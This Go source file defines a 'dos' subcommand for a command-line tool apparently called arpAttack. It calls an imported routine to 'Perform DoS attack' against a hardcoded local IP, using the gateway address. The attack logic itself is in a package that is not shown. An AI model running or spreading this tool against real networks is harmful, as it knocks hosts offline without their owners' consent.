package cmd

import (
	"fmt"
	"log"

	"github.com/rogercoll/arpAttack/pkg/dos"
	"github.com/spf13/cobra"
)

// evenCmd represents the even command
var dosCmd = &cobra.Command{
	Use:   "dos",
	Short: "Perform DoS attack",
	Long:  `Perform DoS attack`,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("Hello badAss, please provide more args")
		err := dos.Run("wlp58s0", "192.168.1.69", "192.168.1.1")
		if err != nil {
			log.Fatal(err)
		}
	},
}

func init() {
	rootCmd.AddCommand(dosCmd)
}
